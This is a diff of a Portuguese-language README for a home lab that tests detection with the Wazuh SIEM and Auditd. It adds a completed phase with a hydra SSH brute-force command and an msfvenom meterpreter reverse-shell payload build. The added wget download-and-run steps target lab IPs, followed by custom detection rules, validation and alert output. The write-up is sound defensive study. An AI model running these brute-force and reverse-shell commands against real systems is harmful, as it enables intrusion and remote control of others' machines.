@@ -147,23 +147,151 @@ Uma classificação tecnicamente mais correta para esse padrão de evento seria 
 
 ---
 
-## Fase 2 — Simulação de ataques de rede (em andamento)
+## Fase 2 — Simulação de ataques de rede e detecção com Auditd (concluída)
 
-> Esta fase ainda não foi executada. Descrição abaixo é o planejamento dos testes.
+Objetivo: sair do cenário local (Fase 1) e validar detecção de ataques originados de outro host na rede, usando um segundo endpoint Linux e um host atacante dedicado. Dois vetores foram testados: força bruta de credenciais via SSH e execução de payload malicioso monitorada via Auditd.
 
-### Objetivo
+### 1. Preparação do endpoint Linux
 
-Validar a capacidade de detecção do Wazuh contra vetores de ataque de rede, usando Kali Linux como host de origem.
+Instalação manual do agente Wazuh (pacote `.deb`) e do `auditd` no endpoint Ubuntu Server (`192.168.1.21`):
 
-### Testes planejados
+![Instalação do agente Wazuh e Auditd no Ubuntu](./evidence/01_ubuntu_wazuh_agent_installation.png)
+*Download do pacote, instalação via `dpkg` apontando `WAZUH_MANAGER='192.168.1.30'`, registro do serviço via `systemctl` e instalação do `auditd`.*
 
-| Tática MITRE | Técnica | Ferramenta | Detecção esperada |
+### 2. Vetor 1 — Força bruta de credenciais via SSH (Hydra)
+
+**Ação executada:** ataque de dicionário com `hydra`, a partir do Kali (`192.168.1.31`), contra o usuário `vboxuser` no endpoint Linux via SSH, testando 6 senhas comuns.
+
+```bash
+echo -e "123456\npassword\nadmin123\nsenha123\nAdmin@123\nvboxuser" > /tmp/passwords.txt
+hydra -l vboxuser -P /tmp/passwords.txt ssh://192.168.1.21 -V -t 4
+```
+
+![Execução do ataque de força bruta via Hydra](./evidence/02_credential_access_hydra_kali_execution.png)
+
+**Resultado do ataque:** nenhuma senha válida encontrada (`0 valid password found`) — o dicionário usado não continha a senha real da conta. Do ponto de vista ofensivo o ataque falhou, mas do ponto de vista de engenharia de detecção isso é irrelevante: o objetivo era gerar telemetria de tentativas de autenticação remota, não obter acesso.
+
+**Detecção:** as tentativas foram capturadas pelo decoder nativo `sshd` do Wazuh, classificadas pela regra `5760` (nível 5, `sshd: authentication failed`).
+
+![Alertas SSH no dashboard, filtrados pelo IP do Kali](./evidence/03_credential_access_hydra_sshd.png)
+*Filtro `data.srcip: "192.168.1.31"` no Discover retornando 10 eventos `sshd: authentication failed` (regra 5760) no intervalo do ataque.*
+
+### 3. Vetor 2 — Geração e execução de payload malicioso
+
+**Geração do payload** no Kali, via `msfvenom`:
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.31 LPORT=4444 -f elf -o /tmp/payload_linux.elf
+```
+
+![Criação do payload ELF no Kali](./evidence/04_execution_msfvenom_kali_creation.png)
+*Binário ELF de 250 bytes gerado com sucesso, sem encoder aplicado.*
+
+**Entrega e execução** no endpoint Linux: servidor HTTP simples no Kali (`python3 -m http.server 8000`), download via `wget` no Ubuntu Server, permissão de execução e execução manual:
+
+```bash
+wget http://192.168.1.31:8000/payload_linux.elf -O /tmp/payload_linux.elf
+chmod +x /tmp/payload_linux.elf
+/tmp/payload_linux.elf
+```
+
+![Download e execução do payload no endpoint Linux](./evidence/05_execution_payload_download_and_run.png)
+
+### 4. Engenharia de detecção — Auditd + regra customizada
+
+Diferente da Fase 1 (onde a detecção usou regras nativas do Wazuh), este vetor exigiu configuração manual, em duas partes:
+
+**a) Regra no Auditd** (`/etc/audit/rules.d/audit.rules`), monitorando a syscall `execve` (59) e marcando os eventos com a chave `execution_detect`.
+
+**b) Leitura do log do Auditd pelo agente Wazuh**, adicionando o bloco `<localfile>` correspondente no `ossec.conf`:
+
+```xml
+<localfile>
+  <log_format>audit</log_format>
+  <location>/var/log/audit/audit.log</location>
+</localfile>
+```
+
+![Trecho do ossec.conf com o localfile do Auditd](./evidence/06_wazuh_agent_config.png)
+
+**c) Regra customizada no Manager** (`/var/ossec/etc/rules/local_rules.xml`), elevando o evento para nível 7 e mapeando a técnica MITRE:
+
+```xml
+<rule id="100003" level="7">
+  <if_group>audit</if_group>
+  <field name="audit.key">execution_detect</field>
+  <description>Auditd: Execution of payload binary detected</description>
+  <mitre>
+    <id>T1059.004</id>
+  </mitre>
+</rule>
+```
+
+![Regra customizada 100003 no local_rules.xml](./evidence/07_wazuh_custom_rule.png)
+
+> **Observação técnica:** o mesmo arquivo contém uma regra `100001` que replica, sem alteração, o exemplo padrão da documentação oficial do Wazuh (`if_sid 5716`, `srcip 1.1.1.1` — um IP fixo de exemplo). Como o IP nunca é adaptado para a rede real do lab, essa regra não tem efeito prático hoje; fica registrado aqui como pendência de limpeza, não como parte funcional da detecção. A regra `100002` (Sysmon) também está presente como preparação para uma futura integração com o endpoint Windows, mas ainda não foi testada.
+
+### 5. Validação com `wazuh-logtest` antes de confiar na regra
+
+Antes de considerar a regra funcional, o evento foi testado manualmente com o utilitário `wazuh-logtest`, para confirmar as três fases do pipeline de decodificação — pré-decoding, decoding e filtragem de regras — sem depender de gerar um evento real toda vez:
+
+![Fase 1 do wazuh-logtest: pré-decoding](./evidence/08_wazuh_logtest.png)
+
+![Fase 2 e 3 do wazuh-logtest: decoding do Auditd e regra 100003 disparada](./evidence/09_wazuh_logtest_2.png)
+*Confirmação de que o decoder `auditd` extrai corretamente os campos (`audit.key: execution_detect`, `audit.exe: /tmp/payload_linux.elf`) e que a regra 100003 é corretamente disparada (nível 7, MITRE T1059.004, tática Execution).*
+
+### 6. Confirmação final no dashboard
+
+![Alerta indexado no Discover](./evidence/10_wazuh_dashboard_alert.png)
+
+![Alerta na aba Events, regra 100003 nível 7](./evidence/11_wazuh_events_alert.png)
+
+Alerta bruto indexado (JSON completo em [`evidence/12_JSON.txt`](./evidence/12_JSON.txt)):
+
+```json
+{
+  "agent": { "ip": "192.168.1.21", "name": "Ubuntu-Server", "id": "002" },
+  "data": {
+    "audit": {
+      "exe": "/tmp/payload_linux.elf",
+      "key": "execution_detect",
+      "command": "payload_linux.e",
+      "success": "yes",
+      "cwd": "/home/vboxuser"
+    }
+  },
+  "rule": {
+    "level": 7,
+    "description": "Auditd: Execution of payload binary detected",
+    "id": "100003",
+    "mitre": { "id": ["T1059.004"], "technique": ["Unix Shell"], "tactic": ["Execution"] }
+  }
+}
+```
+
+**Indicadores extraídos:** `exe` e `command` confirmam o binário executado; `success: yes` confirma execução completa (não bloqueada); `cwd` confirma o diretório de trabalho do usuário `vboxuser`, consistente com o cenário de entrega manual descrito acima — sem indício de escalonamento de privilégio nesta etapa.
+
+### 7. Análise do analista
+
+O alerta reflete corretamente a técnica **T1204.002 (User Execution: Malicious File)** do lado ofensivo, mas a regra criada mapeia para **T1059.004 (Unix Shell)** do lado de execução — as duas técnicas são complementares, não conflitantes: T1204.002 descreve *como* o payload chegou a ser executado (ação do usuário/atacante), enquanto T1059.004 descreve *o mecanismo de execução* observado pela telemetria (syscall `execve` via shell). Optei por manter o mapeamento em T1059.004 na regra porque é isso que o Auditd de fato observa no nível de sistema; a tabela de mapeamento abaixo documenta as duas técnicas envolvidas no vetor completo.
+
+Como próximo passo de maturidade, a regra 100003 hoje dispara para qualquer execução com a chave `execution_detect` — o que é adequado para lab, mas em produção eu adicionaria contexto adicional (ex: hash do binário, diretório de origem fora do padrão como `/tmp`) para reduzir falsos-positivos de scripts legítimos.
+
+### 8. Mapeamento MITRE ATT&CK — Fase 2
+
+| Tática | Técnica | Ferramenta / Ação | Detecção / Telemetria |
 |---|---|---|---|
-| Reconnaissance | T1595.001 — Active Scanning: IP Addresses | `nmap` | Correlação de múltiplas conexões/porta em curto intervalo |
-| Credential Access | T1110.002 — Brute Force: Password Cracking | `hydra` (RDP/SMB) | Event ID 4625, Logon Type 3, múltiplas falhas do mesmo IP |
-| Execution | T1204.002 — User Execution: Malicious File | `msfvenom` (payload de teste, ambiente isolado) | Sysmon Event ID 1 (criação de processo), árvore de processo suspeita |
+| Credential Access | T1110.002 — Brute Force: Password Cracking | `hydra` contra SSH | Event `sshd: authentication failed`, regra Wazuh 5760 (nível 5) |
+| Execution | T1204.002 — User Execution: Malicious File | Download (`wget`) e execução manual do payload ELF | — |
+| Execution | T1059.004 — Command and Scripting Interpreter: Unix Shell | Execução do payload via shell, capturada por syscall `execve` | Auditd (`audit.key: execution_detect`) → regra customizada Wazuh 100003 (nível 7) |
 
-Integração planejada: Sysmon no endpoint Windows para auditoria de criação de processos, complementando os logs nativos de segurança.
+### 9. Troubleshooting — erros encontrados e soluções
+
+| Problema | Causa | Solução |
+|---|---|---|
+| Campos do Auditd (`data.audit.key` etc.) não eram extraídos pelo Wazuh | `ossec.conf` configurado com `<log_format>syslog</log_format>` para o log do Auditd | Alterado para `<log_format>audit</log_format>`, formato correto para esse tipo de log |
+| Erro ao reiniciar `wazuh-analysisd` ao salvar a regra customizada | ID de regra duplicado (`100002` já em uso no `local_rules.xml`) | Regra renomeada para um ID único no ambiente (`100003`) |
+| Evento não aparecia no Discover mesmo após confirmado pelo `wazuh-logtest` | Divergência de minutos entre o timestamp do evento e o filtro padrão "Last 15 minutes" | Ajuste da janela de busca para "Last 1 hour" e busca direta por `data.audit.key: "execution_detect"` em vez de depender só do filtro de tempo |
 
 ---
 
@@ -178,8 +306,10 @@ Integração planejada: Sysmon no endpoint Windows para auditoria de criação d
 
 ## Tecnologias utilizadas
 
-- Wazuh SIEM 4.9.2 (Manager, Indexer, Dashboard)
-- Windows 11 Home — endpoint monitorado
-- Kali Linux — host de simulação de ataque (Fase 2)
-- Oracle VirtualBox — virtualização
-- PowerShell — automação de deploy do agente
+- Wazuh SIEM 4.9.2 (Manager, Indexer, Dashboard) / Wazuh Agent 4.9.2 e 4.7.2
+- Windows 11 Home — endpoint monitorado (Fase 1)
+- Ubuntu Server + Auditd — endpoint monitorado (Fase 2)
+- Kali Linux — host de simulação de ataque: `hydra`, `msfvenom` (Fase 2)
+- Oracle VirtualBox — virtualização, rede em modo Bridge
+- PowerShell / Bash — automação de deploy dos agentes
+- `wazuh-logtest` — validação de regras e decoders antes de depender de eventos reais
